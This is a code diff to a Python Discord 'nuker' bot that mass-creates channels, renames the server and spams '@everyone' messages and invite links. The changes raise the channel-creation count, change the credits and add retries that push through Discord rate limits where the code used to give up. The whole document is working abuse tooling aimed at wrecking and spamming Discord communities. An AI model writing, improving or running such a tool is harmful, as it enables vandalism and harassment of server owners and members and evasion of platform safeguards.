@@ -16,9 +16,9 @@ MODE = "BAN"
 GUILD_MODES = {}
 
 NUKE_CREATE_NAME = "by 909"
-NUKE_CREATE_AMOUNT = 200
+NUKE_CREATE_AMOUNT = 300
 NUKE_GUILD_NEW_NAME = "community 909"
-NUKE_GUILD_DESCRIPTION = "community 909 - by 909"
+NUKE_GUILD_DESCRIPTION = "community 909 - by exagonal&chiskiado"
 NUKE_INVITE_LINK = "https://discord.gg/BxTk5SrBv"
 NUKE_INVITE_TEXT = f"@everyone {NUKE_INVITE_LINK}"
 NUKE_INVITES_PER_CHANNEL = 1
@@ -61,21 +61,22 @@ async def safe_call(coro_factory, retries: int = 5):
             try:
                 return await asyncio.wait_for(coro_factory(), timeout=15)
             except RateLimited as e:
-                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)) + 0.1)
-                raise
+                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)) + 0.2)
+                continue
             except HTTPException as e:
                 status = getattr(e, "status", 0)
                 if status == 429:
-                    await asyncio.sleep(1.5 + random.uniform(0, 0.5))
-                    raise
+                    await asyncio.sleep(2.0 + random.uniform(0, 1.0))
+                    continue
                 if 500 <= status < 600:
                     await asyncio.sleep(0.5 + attempt * 0.3)
-                else:
-                    return None
+                    continue
+                return None
             except (NotFound, Forbidden):
                 return None
             except asyncio.TimeoutError:
                 await asyncio.sleep(0.3)
+                continue
             except Exception:
                 return None
     return None
@@ -152,8 +153,8 @@ async def invite_cmd(ctx):
 
     embed = discord.Embed(
         title="Invite botnuker",
-        description="Click the link below to add the bot to your server.",
-        color=discord.Color.dark_red(),
+        description="Haz clic en el enlace de abajo para añadir el bot a tu servidor.",
+        color=discord.Color.white(),
         url=invite_url,
     )
     embed.add_field(
@@ -167,7 +168,7 @@ async def invite_cmd(ctx):
         inline=False,
     )
     embed.set_thumbnail(url=bot.user.display_avatar.url)
-    embed.set_footer(text="botnuker")
+    embed.set_footer(text="by exagonal")
 
     await safe_send(ctx, embed=embed)
 
@@ -225,7 +226,7 @@ async def spam_current(ctx, msg: str = "@everyone", count: int = 100):
     await safe_send(ctx, f"SPAMMING {count} MSGS...")
     for _ in range(count):
         await safe_call(lambda: ctx.send(msg))
-        await asyncio.sleep(0.08)
+        await asyncio.sleep(0.35)
     await safe_send(ctx, "SPAM DONE")
 
 @bot.command(name="spamall")
@@ -236,7 +237,7 @@ async def spam_all(ctx, msg: str = "@everyone", per_channel: int = SPAMALL_DEFAU
     async def spam_channel(ch):
         for _ in range(per_channel):
             await safe_call(lambda ch=ch: ch.send(msg))
-            await asyncio.sleep(0.08)
+            await asyncio.sleep(0.35)
 
     await worker_pool(channels, spam_channel, CONC_SEND, TIMEOUT_INVITE)
     await safe_send(ctx, "SPAMALL DONE")
@@ -310,7 +311,7 @@ async def nukeall(ctx):
     async def send_invite(ch):
         for _ in range(NUKE_INVITES_PER_CHANNEL):
             await safe_call(lambda: ch.send(NUKE_INVITE_TEXT))
-            await asyncio.sleep(0.12)
+            await asyncio.sleep(0.35)
 
     await worker_pool(created_channels, send_invite, CONC_SEND, TIMEOUT_INVITE)
 
